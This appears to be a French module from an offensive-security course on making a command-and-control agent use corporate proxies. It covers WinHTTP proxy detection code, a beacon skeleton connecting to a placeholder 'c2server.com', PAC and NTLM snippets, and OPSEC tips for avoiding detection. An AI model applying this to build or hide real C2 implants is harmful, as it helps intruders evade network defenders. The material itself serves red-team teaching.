# Proxy Awareness - D\u00e9tection et Utilisation des Proxies

## Objectifs

- [ ] D\u00e9tecter automatiquement les param\u00e8tres proxy syst\u00e8me
- [ ] Utiliser WPAD (Web Proxy Auto-Discovery)
- [ ] G\u00e9rer l'authentification proxy (NTLM)
- [ ] Impl\u00e9menter un agent C2 proxy-aware

## Introduction

En entreprise, le trafic passe souvent par un proxy. Un agent C2 qui ignore le proxy sera bloqu\u00e9. La "proxy awareness" permet de d\u00e9tecter et utiliser automatiquement le proxy, comme le ferait un navigateur l\u00e9gitime.

**Analogie** : Dans un immeuble avec portier (proxy), vous devez passer par le portier pour sortir. Un visiteur qui essaie de sauter par la fen\u00eatre (bypass proxy) sera rep\u00e9r\u00e9.

## Concepts

### 1. Types de configuration proxy

| Type | Description | D\u00e9tection |
|------|-------------|----------|
| **Aucun** | Connexion directe | Pas de config |
| **Manuel** | IP:Port fix\u00e9 | Registry/IE settings |
| **WPAD** | Auto-discovery | DNS/DHCP |
| **PAC** | Fichier script | URL dans registry |

### 2. API Windows

```c
// WinHTTP : D\u00e9tection automatique
WINHTTP_CURRENT_USER_IE_PROXY_CONFIG proxyConfig;
WinHttpGetIEProxyConfigForCurrentUser(&proxyConfig);

// WinInet : Utilise config IE automatiquement
InternetOpen(..., INTERNET_OPEN_TYPE_PRECONFIG, ...);
```

## Code - D\u00e9tection Proxy

```c
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#pragma comment(lib, "winhttp.lib")

void DetectProxySettings() {
    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG proxyConfig;
    ZeroMemory(&proxyConfig, sizeof(proxyConfig));

    if (WinHttpGetIEProxyConfigForCurrentUser(&proxyConfig)) {
        printf("[*] Proxy Configuration:\n");

        if (proxyConfig.fAutoDetect) {
            printf("  - Auto-detect (WPAD): Enabled\n");
        }

        if (proxyConfig.lpszAutoConfigUrl) {
            wprintf(L"  - PAC URL: %s\n", proxyConfig.lpszAutoConfigUrl);
            GlobalFree(proxyConfig.lpszAutoConfigUrl);
        }

        if (proxyConfig.lpszProxy) {
            wprintf(L"  - Manual Proxy: %s\n", proxyConfig.lpszProxy);
            GlobalFree(proxyConfig.lpszProxy);
        }

        if (proxyConfig.lpszProxyBypass) {
            wprintf(L"  - Proxy Bypass: %s\n", proxyConfig.lpszProxyBypass);
            GlobalFree(proxyConfig.lpszProxyBypass);
        }
    } else {
        printf("[-] No proxy configured\n");
    }
}

int main() {
    DetectProxySettings();
    return 0;
}
```

## Beacon Proxy-Aware

```c
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#pragma comment(lib, "winhttp.lib")

BOOL SendBeaconViaProxy(const char* url) {
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,  // Utilise proxy syst\u00e8me
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession) return FALSE;

    // WinHTTP g\u00e8re automatiquement WPAD/PAC
    HINTERNET hConnect = WinHttpConnect(hSession, L"c2server.com",
        INTERNET_DEFAULT_HTTPS_PORT, 0);

    // ... envoyer beacon ...

    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return TRUE;
}
```

## WPAD (Web Proxy Auto-Discovery)

WPAD cherche un fichier `wpad.dat` via DNS/DHCP :
1. DNS: `wpad.domaine.com`
2. DHCP: Option 252

**Fichier PAC** (Proxy Auto-Config) :
```javascript
function FindProxyForURL(url, host) {
    if (shExpMatch(host, "*.internal.com")) {
        return "DIRECT";
    }
    return "PROXY proxy.corp.com:8080";
}
```

## Authentification Proxy (NTLM)

```c
// WinHTTP g\u00e8re automatiquement NTLM
DWORD dwAutoLogonPolicy = WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW;
WinHttpSetOption(hRequest,
    WINHTTP_OPTION_AUTOLOGON_POLICY,
    &dwAutoLogonPolicy,
    sizeof(dwAutoLogonPolicy));
```

## OPSEC

```
[Best Practices]
\u2713 Toujours utiliser PRECONFIG/DEFAULT_PROXY
\u2713 Respecter bypass list (*.internal.com)
\u2713 G\u00e9rer NTLM auth automatiquement
\u2713 Fallback : direct si proxy \u00e9choue (avec pr\u00e9caution)

[D\u00e9tection]
\u2717 Bypass proxy = comportement anormal
\u2717 Connexions directes depuis r\u00e9seau corporate
\u2717 Echecs auth proxy r\u00e9p\u00e9t\u00e9s
```

## R\u00e9sum\u00e9

- **Proxy awareness** : D\u00e9tecter et utiliser proxy automatiquement
- **WinHTTP** : `WINHTTP_ACCESS_TYPE_DEFAULT_PROXY` + auto-NTLM
- **WinInet** : `INTERNET_OPEN_TYPE_PRECONFIG` (plus simple)
- **WPAD** : Auto-discovery via DNS/DHCP
- **OPSEC** : ESSENTIEL en entreprise, bypass = d\u00e9tection

## Ressources

- [WPAD Specification](https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol)
- [WinHTTP Proxy Detection](https://docs.microsoft.com/en-us/windows/win32/winhttp/winhttp-autoproxy-api)

---

**Navigation**
- [Pr\u00e9c\u00e9dent](../W50_domain_fronting/)
- [Suivant](../W52_smb_communication/)
